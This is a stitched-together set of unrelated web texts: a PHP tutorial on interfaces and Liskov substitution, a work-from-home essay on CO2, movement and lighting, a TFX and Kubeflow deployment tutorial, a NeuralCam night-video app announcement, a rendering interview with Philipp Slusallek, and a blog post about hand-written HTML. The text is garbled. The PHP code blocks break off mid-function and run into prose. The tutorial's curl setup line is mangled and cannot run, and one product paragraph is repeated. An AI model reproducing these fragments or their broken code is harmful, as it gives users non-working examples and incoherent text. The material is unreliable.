<p>Now we can decouple the logic that we had already created for our use case and implement it in a class that implements our interface.</p>
<pre><code><span>&lt;?php</span>

<span>class</span><span> </span><span>UserAuthentication</span><span> </span><span>implements</span><span> </span><span>LoginInterface</span>
<span>{</span>
<span>    </span><span>public</span><span> </span><span>function</span><span> </span><span>authenticateUser</span><span>($</span><span>user</span><span>)</span>
<span>    </span><span>{</span>
<span>        </span><span>// TODO: Implement authenticateUser() method.</span>
<span>    </span><span>}</span>
<span>}</span>

<span>Class</span><span> </span><span>ThirdPartyUserAuthentication</span><span> </span><span>implements</span><span> </span><span>LoginInterface</span>
<span>{</span>
<span>    </span><span>public</span><span> </span><span>function</span><span> </span><span>authenticateUser</span><span>($</span><span>user</span><span>)</span>
<span>    </span><span>{</span>
<span>        </span><span>// TODO: Implement authenticateUser() method.</span>
<span>    </span><span>}</span>
<span>}</span></code></pre>
<p>Now our LoginService class doesn't care what type of user we have, it just interacts with a 'LoginInterface'.</p>
<pre><code><span>&lt;?php</span>

<h2 id="liskov-substitution">Liskov Substitution</h2>
<p>Coined by Barbara Liskov, this principle states that any implementation of an abstraction (interface) should be substitutable in any place that abstraction is accepted.</p>
<p>In layman’s terms, it states that an object of a parent class should be replaceable by objects of its child class without causing issues in the application. So, a child class should never change the characteristics of its parent class (such as the argument list and return types). You can implement the Liskov Substitution Principle by paying attention to the correct inheritance hierarchy.</p>
<p>Let's say we have a Shipping class that is going to calculate the shipping cost of a product given its weight and destination.</p>
<pre><code><span>&lt;?php</span>
<span>class</span><span> </span><span>Shipping</span>
<span>{</span>
<span>    </span><span>public</span><span> </span><span>function</span><span> </span><span>calculateShippingCost</span><span>($</span><span>weightOfPackageKg</span><span>, </span><span>$</span><span>destiny</span><span>)</span>

<span>        </span><span>}</span>

<span>        </span><span>// We calculate the shipping cost by</span>

<span>    </span><span>}</span>
<span>}</span></code></pre>
<p>But then for worldwide shipping, we want these rules to be slightly different, so we create a child class that extends the Shipping class.</p>
<pre><code><span>&lt;?php</span>
<span>class</span><span> </span><span>WorldWideShipping</span><span> </span><span>extends</span><span> </span><span>Shipping</span>

<span>        </span><span>return</span><span> </span><span>$</span><span>shippingCost</span><span>;</span>
<span>    </span><span>}</span>
<span>}</span></code></pre>
<p>The problem here is that the worldwide shipping method does not provide the same implementation, as seen by <code>$destiny</code> now throwing an exception if empty.</p>
<p>The best way not to break LSP is by using Interfaces. Instead of extending our child classes from a parent class.</p>
<pre><code><span>&lt;?php</span>

<p>It’s been nearly ten years that I have worked mainly from home (or more accurately, <em>homes</em>, as we moved around a bit). As it turns out, many people now work from home, less so by choice than by <s>dystopian scenario C</s> circumstance. Whilst I’m sure that there are already hundreds of articles on the topic I thought I’d write a bit about my experience and especially about some aspects that may not be that obvious and that took me a while to prioritize.</p>
<h2 id="h-indoor-co2-level">Indoor CO<sub>2</sub> level </h2>
<p>What is very often overlooked when working from home is the topic of air quality and particularly the one of CO<sub>2</sub> level. Modern offices mostly have ventilation systems that constantly bring in fresh air (at an adjusted temperature) – you may not even be aware of them when working at an office as they’re often built into the ceiling. I’m not talking about air conditioning here – that’s a different process which focuses on changing the temperature, not the air itself.</p>
<p>Do you know the feeling you have after sitting one hour in a windowless meeting room with 6 other people and finally getting up again? What’s so tiring about those meetings often isn’t the content of the meeting itself or the other people (although arguably both can be) – it is the lack of fresh air, or rather, the increase of CO<sub>2</sub> level in the room. CO<sub>2</sub> level is measured in particle-per-million (PPM) and the outside air level is typically around 400-500 PPM (although that’s been raising at an alarming rate over the past century). There are by now quite a <a href="https://www.emcoruk.com/news/2018/c02-levels-offices-silently-damaging-uk-productivity-finds-new-study" target="_blank" rel="noreferrer noopener">few</a> <a href="https://hbr.org/2017/03/research-stale-office-air-is-making-you-less-productive" target="_blank" rel="noreferrer noopener">studies</a> <a href="https://ehp.niehs.nih.gov/doi/10.1289/ehp.1510037" target="_blank" rel="noreferrer noopener">on</a> <a href="https://thinkprogress.org/exclusive-elevated-co2-levels-directly-affect-human-cognition-new-harvard-study-shows-2748e7378941/" target="_blank" rel="noreferrer noopener">the</a> <a href="https://www.researchgate.net/publication/41464093_Work_performance_productivity_and_indoor_air" target="_blank" rel="noreferrer noopener">topic</a>, the findings are pretty clear: increased CO<sub>2</sub> levels make it harder to focus and think:</p>

<p>With a baseline of ~400 PPM (here in Vienna) you can now see why the current indoor CO<sub>2</sub> as I am writing this article is not ideal:</p>

<p>So if you’re now working at home and your home does not have a built-in air-conditioning system, there are a few things that you can do:</p>
<ul><li>get a CO<sub>2</sub> monitor. The one I have for 2 years now is the <a href="https://www.tfa-dostmann.de/en/produkt/co2-monitor-airco2ntrol-mini/" target="_blank" rel="noreferrer noopener">TFA Dostmann Air CO2ntrol mini</a> and I am quit happy with it. It is important to get a good monitor / sensor, as wrong readings won’t help you much.</li><li>get a flew plants. <a href="https://luxafor.com/top-9-best-air-purifying-plants-for-office-that-are-low-effort-and-care-guide/" target="_blank" rel="noreferrer noopener">NASA has some recommendations</a> on plants that are good filters. One thing to be aware of though is that plants are producing CO2 at night, so I wouldn’t recommend getting many of those plants if your home office is in your bedroom (which I would not recommend at all anyway)</li><li>advanced: setup air ventilation for your home office (or your entire home if you feel like it). This is what I am doing now after spending a few years getting up to open and close the window every half hour (and wasting quite a bit of energy during the winter). This is a sizeable investment so you have to know you’re going to use the home-office for a longer stretch of time</li></ul>
<h2 id="h-movement-or-lack-thereof">Movement (or lack thereof)</h2>
<p>It took me ten years and a pandemic to figure out the prevalence of lack of movement in a “working from home” setting. Moving (walking, standing up, etc.) is built-in to the flow of working in an office with other people: going to the meeting room, fetching a coffee, going out for lunch, etc. — and even if it does not seem that much, all these steps add up during the day. When working from home for longer periods of time it requires discipline to build these habits back into the daily rhythm. Absence of commute (with all the advantages it brings, especially for longer, time-consuming commutes) also means absence of a planned period of movement. And unless you have a large apartment or house, chances are that the relative lack of space makes it less appealing to walk around.</p>
<p>I’m sure I could find a nice set of studies showing that lack of movement is bad for productivity and health. But you already know that. It is repeated so often by so many health professionals that the opposite effect takes place and people simply ignore the advice. The first question you get during a routine physical examination with your doctor is: <em>do you exercise regularly</em>? But this isn’t about exercising or doing sports (which are both very good things to do, of course) – it is about the fact that we humans are designed to walk. We evolved over millennia to function as hunter-gatherers. And it isn’t the past century that will undo and teach our bodies to function properly whilst sitting or standing all day long at a desk. So:<strong> move</strong>. <strong>Every.</strong> <strong>Day.</strong></p>

<p>Now, clearly, the current pandemic and its restrictions do not help. But it may just be that because of these restrictions that restrict the natural type of movement that it is even more important to pay even more attention to getting enough of it.</p>
<p>A few actionable things you can do to help getting enough movement:</p>
<ul><li>get one of those fitness trackers and set a goal to do 10000 steps (or more) per day</li><li>introduce a virtual commute at the beginning and end of your work day</li><li>advanced: build a habit to run regularly (I run almost every day)</li></ul>
<h2 id="h-light-and-lighting">Light and lighting</h2>
<p>I’m not mentioning this topic because of “light ergonomics”, i.e. having another source of light in addition to your computer screen in order to reduce eye strain. Or because of <a href="https://en.wikipedia.org/wiki/Seasonal_affective_disorder" target="_blank" rel="noreferrer noopener">seasonal affective disorder</a>. What I’m after here is how incorrect lighting can affect sleep and creativity.</p>
<p><a href="https://medium.com/s/how-to-design-creative-workspaces/how-to-use-the-psychology-of-light-and-lighting-to-boost-your-creativity-b61a574b5751" target="_blank" rel="noreferrer noopener">Light and lighting help us think</a>. Being always exposed to the same light – color and luminosity – is not only disruptive for our circadian rhythm, negatively impacting the sleep but also for our thought process.</p>

<p>I ended up equipping my office with <a href="https://www.ikea.com/gb/en/cat/smart-lighting-36812/" target="_blank" rel="noreferrer noopener">Ikea Tradfri</a> panels and bulbs which can be remote controlled and even programmed to change brightness and color / warmth as the day progresses.</p>
<h2 id="h-all-the-rest">All the rest</h2>
<p>To me the following points are obvious and I think they’re also covered in many other articles or aren’t necessarily related to working in a home-office. That does not make them less important though. So just for good measure here they are:</p>
<ul><li>if you can, avoid working in the same room than you sleep. If you can’t, physically separate the space with a <a href="https://en.wikipedia.org/wiki/Folding_screen" target="_blank" rel="noreferrer noopener">folding screen</a></li><li>use an ergonomic chair</li><li>use a sit-stand desk and make it a habit to stand up from time to time</li><li>prefer one large / wide screen to several ones. Avoid using screens of different sizes (such as laptop &amp; external monitor)</li><li>if you type a lot, prefer an ortholinear keyboard and a touchpad to a classic keyboard and mouse to prevent <a href="https://en.wikipedia.org/wiki/Carpal_tunnel_syndrome" target="_blank" rel="noreferrer noopener">carpal tunnel syndrome</a></li><li>take regular breaks, using timers if need be</li><li>drink enough water</li><li>move. Seriously, don’t forget to move.</li></ul>

<blockquote><p>If I had a dollar for every machine learning model wasting in Jupyter Notebooks across the industry, I’d be a millionaire. — Me</p></blockquote>



<p>It is one thing to build models, yet another to put them in production. One of the hardest parts of machine learning is effectively putting models in production.&nbsp;</p>



<p>With an emphasis on <strong>effectively</strong> here, because while there are lots of ways to put models in production, there exist few tools that can effectively deploy, monitor, track, and automate this process.</p>



<p>In this tutorial, I’m going to introduce you to <strong>TensorFlow Extended, popularly known as TFX. </strong>You’re going to take an example machine learning project and put it in production using TFX, Google AI Platform Pipelines, and Kubeflow.&nbsp;</p>

<h2 id="Introduction">Introduction to TFX and Kubeflow</h2>



<p>TFX is a production-scale machine learning platform based on Tensorflow. It is owned and actively maintained by Google, and it’s used internally at Google.&nbsp;</p>

<p><strong>TFX provides a bunch of frameworks, libraries, and components for defining, launching, and monitoring machine learning models in production.&nbsp;</strong></p>



<p>The components available in TFX let you build efficient ML pipelines specifically designed to scale from the start. These components include:</p>



<ul><li>modeling,&nbsp;</li><li>training&nbsp;</li><li>serving (inference),&nbsp;</li><li>and managing deployments to different targets like web, mobile or IoT devices.</li></ul>



<p>In the diagram below, you see a relationship between available TFX libraries and available pipeline components you can use to achieve this.&nbsp;</p>

<hr>



<p>You’ll notice that TFX libraries and components cover a typical end-to-end machine learning pipeline, which starts with data ingestion and ends with model serving.</p>



<p>The TFX libraries for achieving the different tasks shown above are available in Python and can be installed separately. But it’s advisable to just install TFX, which comes with all the components.&nbsp;</p>



<p><strong>As you proceed along with this tutorial, you’ll use different TFX components, and I’ll first explain what it does before showing you how to use it.&nbsp;</strong></p>





<h3><strong>TFX under the hood and orchestrators</strong></h3>



<p>By default, TFX creates a directed acyclic graph (DAG) of your ML pipeline. It uses <a href="https://beam.apache.org/" target="_blank" rel="noreferrer noopener nofollow">Apache-Beam</a> under the hood for managing and implementing pipelines, and this can be easily executed on distributed processing back-ends like <a href="https://spark.apache.org/" target="_blank" rel="noreferrer noopener nofollow">Apache Spark</a>, <a href="https://cloud.google.com/dataflow" target="_blank" rel="noreferrer noopener nofollow">Google Cloud Dataflow,</a> <a href="https://flink.apache.org/" target="_blank" rel="noreferrer noopener nofollow">Apache Flink</a>, and so on.&nbsp;</p>



<p>It’s important to mention that Beam comes with a direct runner, so it can be used in scenarios like testing or small deployments.&nbsp;</p>



<p>While TFX running Apache Beam is cool and all, it is difficult to configure, monitor, and maintain defined pipelines and workflows. This gave rise to tools we call orchestrators.&nbsp;</p>



<p>Orchestrators like Kubeflow or Apache Airflow make it easy to configure, operate, monitor, and maintain ML pipelines. They mostly come with GUIs that you can easily understand.&nbsp;</p>



<p><strong>Below is a sample GUI of Airflow showing defined tasks:</strong></p>

<p>In the opened Jupyter Notebook, you’re provided with a template file in the <strong>imported</strong> folder that helps you perform some important configuration and setup, as well as a template for working with TFX components.&nbsp;</p>



<p>We’ll leverage a lot of this configuration later, but for now let’s start building our project.&nbsp;</p>



<p>In the notebook, create a new folder for your project (<strong>advert-pred</strong>). In that folder, create a new Jupyter notebook (<strong>advert-experimentation</strong>) and open it.&nbsp;</p>



<div><figure><img data-attachment-id="28305" data-permalink="https://neptune.ai/blog/deep-dive-into-ml-models-in-production-using-tfx-and-kubeflow/jupyter-notebook" data-orig-file="https://i0.wp.com/neptune.ai/wp-content/uploads/Jupyter-notebook.png?fit=1364%2C780&amp;ssl=1" data-orig-size="1364,780" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Jupyter-notebook" data-image-description="" data-medium-file="https://i0.wp.com/neptune.ai/wp-content/uploads/Jupyter-notebook.png?fit=300%2C172&amp;ssl=1" data-large-file="https://i0.wp.com/neptune.ai/wp-content/uploads/Jupyter-notebook.png?fit=1024%2C586&amp;ssl=1" loading="lazy" src="https://i0.wp.com/neptune.ai/wp-content/uploads/Jupyter-notebook.png?resize=768%2C439&amp;ssl=1" alt="advert experiment" width="768" height="439" srcset="https://i0.wp.com/neptune.ai/wp-content/uploads/Jupyter-notebook.png?resize=1024%2C586&amp;ssl=1 1024w, https://i0.wp.com/neptune.ai/wp-content/uploads/Jupyter-notebook.png?resize=300%2C172&amp;ssl=1 300w, https://i0.wp.com/neptune.ai/wp-content/uploads/Jupyter-notebook.png?resize=768%2C439&amp;ssl=1 768w, https://i0.wp.com/neptune.ai/wp-content/uploads/Jupyter-notebook.png?w=1364&amp;ssl=1 1364w" sizes="(max-width: 768px) 100vw, 768px" data-recalc-dims="1"></figure></div>



<p>In this Jupyter notebook, you’re going to walk through each TFX component individually and interactively. <strong>This will help you understand what each component is doing</strong>, and then at the end, you’ll turn your experimentation into a full pipeline and deploy it.</p>



<p>You can get the complete notebook <a href="https://github.com/risenW/tfx-adClickPrediction/blob/master/advert-experiment.ipynb" target="_blank" rel="noreferrer noopener nofollow">here</a> and the complete project code <a href="https://github.com/risenW/tfx-adClickPrediction" target="_blank" rel="noreferrer noopener nofollow">here</a>.</p>





<h3><strong>Setup</strong></h3>



<p>In the first cell of your notebook, you’ll install TFX, Kubeflow (kfp) and a package called skaffold:</p>



<pre># Install tfx <span>and</span> kfp Python packages.
import sys
!{sys.executable} -m pip install --user --upgrade -q tfx==<span>0.22</span><span>.0</span>
!{sys.executable} -m pip install --user --upgrade -q kfp==<span>1.0</span><span>.0</span>
# Download skaffold <span>and</span> <span>set</span> it 
!curl ///skaffold//latest/ /home//.local//Import packages
</pre>



<p><a href="https://skaffold.dev/" target="_blank" rel="noreferrer noopener nofollow"><strong>Skaffold</strong></a><strong> is a command line tool that facilitates continuous development for Kubernetes applications</strong>. It helps us easily manage and handle workflows for building, pushing, and deploying applications. You’ll get to understand the use of Skaffold later.&nbsp;</p>



<p>After running the first cell, you’ll get some warnings – ignore them for now. One of them …</p></article></div></div>

          <div>
            

<p>Hey everyone, <br>

for the past few months we have been working on a new product, and today we’re finally ready to show it to you.
</p>

<div><p>As you probably know, at NeuralCam we have a <a href="https://apps.apple.com/us/app/neuralcam-nightmode/id1474856599" target="_blank">photo NightMode app</a> that’s recognized as the leading night mode solution for iPhones without a built-in photo Night Mode. Ever since the launch of our night mode app, a question kept popping up from our users: <i>“can you build a night mode app for video?”</i>, they asked. 
</p><p>

We’ve pondered this for a while. Unlike photography, there is no obvious straightforward way to build night mode for video. In the case of photos, night mode usually means taking multiple shots with relatively long exposure and combining them into one high quality image. Then brightening and post-processing it for a final look. 

 </p></div>



<p><b>Video</b> is a different beast: you can’t just shoot multiple frames and combine them because you’re limited by both the maximum exposure time a frame can have and by the maximum processing time per frame (milliseconds instead of seconds in the case of real-time video). 

</p>

<p>Clearly, a very different approach is needed. We’ve explored everything from classic to AI-powered video processing techniques and we think we found the right mix of tech that results in much improved low light videos. After months of researching, hacking and developing, we’re proud to present NeuralCam NightVideo, our (and perhaps the world’s first) <b>Video Night Mode</b> app.

</p>
<p><img src="https://neural.cam/news/nightvideo/content/nvid.png">
</p>
<br>

<h3 id="when-they-ghost-mid-project">Night Mode Video</h3>

<p>So how can we build Video NightMode? Where do we get started and why can’t we just take a normal video and brighten it up? Well, because it would look really bad.
</p>

<p>The biggest problem in low light videography (and photography for that matter) is the presence of noise. There’s just too little amount of light hitting the image sensor and this lack of information results in a flickering mess of pixels with different light intensities and colors appearing especially in the darker areas of the scene - not a pleasant view.
</p>
<p>In the case of the photography night mode, this noise is reduced by the mentioned frame merging process - which basically results in more information being added to the target frame. However, with video we don’t have the luxury of multiple frames and processing for seconds to do the processing so we’ll clearly have to find a very different approach. 

</p><h3 id="when-they-ghost-mid-project">Capturing and AI frame-boosting</h3>

<p>The first thing we’re doing is to try to capture the most light inside each frame, which naturally results in less noisy frames. 

</p>

<p>As a standard practice, videos are shot at a shutter speed of no more than 1/24 to keep moving objects sharp and the video smooth. But this also means that this is the maximum amount of time that light can reach the sensor.
</p>

<p>We’ve looked very closely at this problem and figured that there might be a way to let more light in while maintaining the smooth look of the video, namely a combination of longer exposure times and frame interpolation. This way we can use exposure times longer than 1/24 depending on the amount of available light, and then in order to keep the video looking smooth, we generate additional frames using a proprietary Machine Learning powered Video Interpolation algorithm that we’ve built especially for this purpose.</p>

<p>
 The result is a smooth video with a tiny amount of blur - depending on the used settings - and generally a nice “night video” look.

</p>

<p><img src="https://neural.cam/news/nightvideo/content/interp.png">
<br>
</p>



<h3 id="when-they-ghost-mid-project">AI Powered Video Denoising</h3>


<p>Doing the capturing part this way we’ve got higher quality frames, but these generally still have a lot of noise so what we’ll do next is to try to get rid of that.
</p>

<p>It turns out that classic denoising methods aren’t good enough for this case, they usually blur the whole image, including edges and are helpless at the noise levels present in low light shots taken with a smartphone camera. Also, they’re quite slow as well.
</p>

<p>To solve this problem we’ve built a Machine Learning-based denoising algorithm. Specially developed for the iPhone camera, it removes even the heaviest noise and does so selectively and adaptively only on the areas of the image where noise is present. The result is a much cleaner look in the bright areas of the video and a massive reduction of the ugly flickering effect in the darker parts of the image.

</p>

<h3>Brightening</h3>


<p>As a final step after the capturing, interpolation and denoising, it’s finally possible to brighten up the image and get a good looking, smooth video as the result. The amount of brightening applied depends on the selected mode.</p>

<h3>Different Video Night Modes</h3>


<p>As a final step after the capturing, interpolation and denoising, it’s finally possible to brighten up the image and get a good looking, smooth video as the result. The amount of brightening applied depends on the selected mode.</p>

<br>
</p>
<p>In order to cover as many shooting situations as possible we’ve come up with 5 different capture modes:

</p>



<h4>Day:
</h4>



<p>The first capturing mode is not even a night mode at all. It is targeted at lower light day shots, or scenes with high dynamic range where the results of the default iPhone camera start to get too noisy. This mode contains no brightening, but because of the use of our AI denoising algorithm, resulting videos have a cleaner, more pleasant look. It’s especially useful when used with the ultra wide camera, in the case of which noise can appear even in medium-lit indoor situations.

</p>

<h4>Dusk:</h4>

<p>
  
  This mode is designed for semi-low light. It is similar to Day mode, shot at a high frame rate to maintain sharp subjects in high movement situations, but in addition to denoising it also includes a bit of additional brightening. 

</p>
<h4>
Night:
</h4>

<p>The “Night” mode is the default mode for shooting night videos. It uses a slightly longer exposure time, that combined with our denoising and frame interpolation algorithms generates a bright, clean and smooth night video. This is the mode to use for most night scenes. 
</p>

<br>
</p>


<h4>Night+:</h4>

<p>A further enhanced mode for really dark scenes. In this mode, videos have an additional amount of blur but provide a brighter night video with the same clean noise-less look. In most of these situations the built-in camera can't produce usable results.

</p>

<h4>Time-lapse:</h4>

<p>A Night Time-lapse mode, similar to the one on the new iPhone 12 default camera - now made available by NeuralCam NightVideo for older iPhones too. This mode doesn’t have sound and can handle even lower light situations, which combined with a faster playback, generates the specific night mode time-lapse look.

<source src="https://neural.cam/news/nightvideo/content/timelapse.mp4" type="video/mp4">

<br>
</p>

<h4>*Gentle Light:</h4>

<p>Each of the modes can be combined with the “gentle light” feature, where the app turns on the flashlight, but at one of the lowest levels in order to keep the resulting video still natural and avoid “blinding” people. Gentle light can be used in totally dark scenes with subjects that are close enough to be illuminated by a small amount of light.
</p>

<h3>Real-time on-device processing</h3>

<p>All this processing runs in real-time on the iPhone, making full use of the power the NeuralEngine provides. This real-time processing means that we can provide the same instant video capturing experience you’re used to with your default camera - tap to capture and everything is displayed and processed on the fly. Since this level of video processing requires quite some processing power, NightVideo is only available on devices with the A12 NeuralEngine (iPhone XR and later) and iOS 14.


</p><p>

  With real-time processing and modes covering everything from slightly low light settings to really dark scenes, NeuralCam NightVideo is the first app to provide Night Mode for Video.

<p>(Interview of Prof. Dr. Philipp Slusallek, accomplished scientist and veteran from the computer graphics field, performed in January 2015 for Seekscale company, a cloud rendering startup)</p>



<p>Hardware acceleration is hot in rendering industry right now, and while people still try to figure out how to split workloads between CPUs and GPUs, FPGAs are quickly rising. We interviewed Philipp Slusallek, Scientific Director and Computer Graphics professor at Saarland University, and talked about what’s hot right now, and above all what we can expect in CG in the near future! We first heard about Philipp by coming across this great <a href="http://www.scarydevil.com/~peter/io/raytracing-vs-rasterization.html" target="_blank" rel="noreferrer noopener">discussion</a>.</p>



<p><strong>– What rendering techniques are best adapted to each hardware (GPU/CPU)?</strong></p>



<p>We basically have two key algorithms for rendering: rasterization and ray tracing. Rasterization is a “forward” rendering approach that renders the triangles in a scene one by one (conceptually) and each time updates all pixels covered by that triangle. Ray tracing, on the other hand, traces rays for each pixel to find out which triangle is visible for that pixel.</p>



<p>While the two seem very different, there are intermediate versions, such as “tile-based rasterization” or “frustum tracing”, where only the triangles covering a part of the screen are rasterized or all rays of a tile a traced together, respectively. If you make these tiles smaller, eventually a single pixel in size, rasterization starts to look much like ray tracing and vice versa as you trace larger and larger frusta. However, we still do not have algorithms that really cover the whole range of options well.</p>



<p>Additionally, we are seeing an increased need for advanced (programmable) shading and lighting effects (e.g. global illumination for smooth indirect illumination). While they are sitting on top of the core renderer, they impose many requirements that will determine what rendering approach can or cannot be used.</p>



<p>On the HW (hardware) side: GPUs started as HW dedicated for rasterization. But they have long evolved to become essentially large parallel compute engines (with some dedicated HW thrown in for rasterization, still). On the other hand, CPUs have become much better at parallel workloads with multi-core, multi-threading, and more and increasingly wide SIMD compute units (MMX, SSE, AVX, and the now upcoming AVX-512).</p>



<p>In some sense the two general HW designs are converging towards a similar sweet spot, but coming from two very different starting points.</p>



<p>Rasterization is more dependent on good HW support to be fast and so runs best on GPUs. Ray-tracing can be implemented with very good performance on each HW architecture, probably with some advantage for CPU-like architectures if you look at the latest comparison in the Embree paper at Siggraph 2014 (which may be a bit biased).</p>



<p><strong>– For a developer working on a renderer, what is the technical arbitrage between writing for a CPU, and for a GPU?</strong></p>



<p>Let me focus on writing a full ray tracing renderer using the raw HW. Writing a “renderer” that makes good use of OpenGL/DirectX is a very different story.</p>



<p>First of all writing a really good renderer is a big challenge — but also a lot of fun, independent of the choice of rendering algorithm or HW. It reaches across many levels from highly optimized inner loops all the way up to data management of often complex scenes. It thus touches many aspects of HW and SW and is a perfect poster child for how to best design efficient code for certain HW architectures.</p>



<p>An obvious key element is strongly optimizing the inner loops of a renderer as it determines the upper limit of the achievable rendering performance. This is where a lot of efforts and research has been, and still is, spent. Today, getting the best performance usually still means to hand-optimize the code (at the assembly or intrinsics level) for specific architectures and different choices of renderer configurations. While this often pays off, it requires expert knowledge, is very tedious, and often needs to be completely rewritten as the HW or the requirements change.</p>



<p>In addition, there are also many interdependencies between choices made at this low levels and the various levels of algorithms above it. This means that one needs to keep the code flexible in order for it to adapt to these requirements. However, with current technology, flexibility conflicts strongly with achieving optimal performance.</p>



<p>As a result of all this, almost all renderers have been targeting only one HW architecture: GPUs or CPUs and even within such an architecture, algorithms might have to be configured very differently on different instances. While cross-plattform renderers have been developed, e.g. in OpenCL, OpenCL is still a very low-level language that is not well suited for all HW architectures thus limiting what can be achieved.</p>



<p>In contrast, the hardware vendors each support renderer development with their HW-specific frameworks: Nvidia’s Optix is focused essentially only on GPUs, while Intel’s Embree targets CPU-like architectures (including their MIC/Xeon Phi processors). One interesting note is that both tools (and others) had to develop their own compiler technology to develop these frameworks. While both of these frameworks are very good choices they are black boxes that each come with their own set of drawbacks and limitations.</p>



<p>Already in 2008 we showed that with the right language/compiler tools high optimization of low-level code does not necessarily limit flexibility of the overall design. Our RTFact system [HPG 2008] used C++ template metaprogramming to specialize generic code from across several levels of abstraction at compile time. With this framework, we were able to easily configure very different renderers based on the same generic code and still achieve performance within about 10% of our previous hand-optimized code in each case — which was really remarkable. Unfortunately, writing the core code via C++ template metaprogramming is really hard and results in “write-only code” that is really hard to maintain. But it showed that performance and flexibility are NOT mutually exclusive!</p>



<p>Since then we have teamed up with one of the best compiler research group here at Saarland University (Prof. Sebastian Hack) and have jointly developed “AnyDSL”: It picks up the original idea of RTfact, generalizes it beyond just rendering, and uses much improved compiler technology to implement automatic specialization of generic code. AnyDSL provides a completely new programming models that offers developers a way for formulating hierarchies of conceptual abstractions while still allowing the compiler to eliminate any overhead usually associated with such abstractions (e.g. virtual function calls in C++).</p>



<p>This finally allows for writing completely generic code at each level of abstraction, specifying how that code should make use of abstractions at the lower levels. Finally, at the lowest level, code that has been coming from the different levels is combined and aggressively specialized using novel compiler algorithms to essentially interpret and partially execute any code that is knows at compile time. This is so effective because at these low level a lot of information that we abstracted from at the high levels is now available, such as information about the HW and the context in which some generic high-level code should be executed and which can be taken into account by the compiler. This approach combined the flexibility of hierarchical abstractions with the ability to generate optimized code that rival and often actually exceed the performance of hand-optimized code.</p>



<p>For example, our tests in image processing show that this approach often beats hand-optimized code because that code is very tedious and difficult to write such that not all promising optimization options are actually explored. Since simply use the generic code plus some rather simple mapping code for each specific HW, exploring the space of possible optimizations is much larger.</p>



<p>By now, we have already written a full ray tracer in AnyDSL that compiles and runs efficiently both on various different GPUs and CPUs. However, not all optimizations have been applied yet, so that we cannot really compare its performance yet. This will happen in the next few months but the partial results we have so far are already very promising.</p>



<p><strong>– Corona Render </strong><a href="http://home.seekscale.com/blog/corona-render-1.0-a-peek-into-interactive-rendering"><strong>uses</strong></a><strong> for example Intel Embree ray tracing library, for the CPU. What do you think of this solution?</strong></p>



<p>As I argue above, these tools are very useful. They provide hand-optimized kernels that solve some of the core problems, particular the inner loops and can thus be used as the basis for the higher layers, just as Corona did. However, they are essentially black boxes which makes it harder to adapt them to different purposes.</p>



<p>I believe that we need to go beyond these individual optimized kernels and create generic, adaptable, and reusable building blocks for rendering. That can be combined in flexible ways to create optimized renderers for many configurations and HW platforms. So far, we have been missing the right tools to even think how this could be done.</p>



<p>With AnyDSL we now have a tool that for the first time allows us to address this challenge. Now we are investigating how the to design such a flexible rendering framework: What are the right abstractions to be used at the different levels? How do we best map them to HW platforms? Which algorithms work best in what context and how do we need to formulate them, so they can easily be combined? How do we determine the data layout to optimize for different algorithms using it? And so on.</p>



<p>Essentially, AnyDSL allows us to rethink the design of renderers in a fundamentally new way.</p>

October 23, 2020 | http://john.ankarstrom.se/html2/ | <a href="https://web.archive.org/web/*/http://john.ankarstrom.se/html2/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <td colspan="3">
      
      <div id="content">
      <p>Some time ago, I wrote a short article called <a href="http://john.ankarstrom.se/html/">"Writing
HTML in HTML"</a>,
where I explained why I use plain HTML to write, edit and maintain my
web site. As I've been living with my decision to eschew both dynamic
content management systems and static site generators for more than a
year, I've had the chance to reflect upon it, and I think it is time
for me to
update and clarify my original vision.</p>
      <p>In this post, I
want to explore two fundamental principles or criteria that underpinned
my original article, but were more or less unpronounced: <b>sustainability</b> and <b>power</b>. I also want to update you on my current site configuration.</p>
      <p>Before I begin, I should say that these criteria are <em>my</em> criteria, they're what <em>I</em>
value, and don't necessarily line up with what other people value. I think there are others who might value the same
things as I do; others will hopefully find the perspective interesting,
even if they don't ultimately agree.<br>
      </p>
<h3>First criterion: sustainability</h3>
      <p>The criterion of sustainability corresponds to the following question:</p>
      <blockquote>
        <p>How difficult will it be for me to maintain – over time –<br>&nbsp;&nbsp;&nbsp; a) the entire site, and<br>
&nbsp;&nbsp;&nbsp; b) any given page on the site?<br>
        </p>
      </blockquote>
      
      <p>In my life, this is a rather harsh rule. I know that
every extra step I need to perform in order to do something is going to
make me avoid doing it more. For this reason, I will consider even minor things – like needing to
install a single extra piece of software on my computer, even if it
takes only a second to install – to be lowering the sustainability of the web site. Relevant here is not only the effort required for me to edit the site, but also how likely the site is to merely <em>survive</em> over long periods of time, through server migrations and infrastructure changes.<br>
</p><h4>WordPress<br>
      </h4>
      <p>As such, I am not talking about "ease of use". WordPress is likely the
least difficult way to run a blog, but it is not the most <em>sustainable</em> way, because the effort required to maintain a WordPress site <em>over long periods of time</em> is
higher than a folder of static HTML files. To migrate a WordPress
site to a new server, you need to export the WordPress database from
MySQL on the old server, setup MySQL on the new server and import the
old database. This may not be a huge effort, but it is not as simple,
neither physically nor mentally, as a copying a folder; thus it lowers
the sustainability of the site.<br>
</p>
      <h4>Jekyll<br>
      </h4>
      <p>On the other hand, a <em>generated</em> folder of static HTML files
is not sustainable just because it can easily be copied to a new server
without having to worry about "invisible" databases. While it is easy
to migrate the site to a new server, it is <em>not</em> effortless to
update the contents of the site, because you can't re-generate a Jekyll-driven site
if you don't have Jekyll installed on the computer. Furthermore, it
is not uncommon for there to be differences in behavior between
different versions of the same generator, making it difficult to
maintain the site over long periods of time; if new versions of your
static site generator introduce breaking changes, your site is not
sustainable, because you will have to update its code whenever you
update the generator.</p>
      <h4>HTTPS<br>
      </h4>
      <p>Sustainability
is also the one of the many reasons why my web site is served
over HTTP and not HTTPS. The problem with HTTPS is that you need to get
a certificate from a trusted authority, which either costs
money or is free but needs to be updated every month, and even if you
pay for it, you need to renew the certificate every year or so. If the
operation of your blog
depends on a monthly certificate renewal from Let's Encrypt – even if
the renewal is set up to be automatic – it is less sustainable
than
serving your site over HTTP. HTTP will <em>always</em> be around, will always be supported and will never require a certificate.</p>
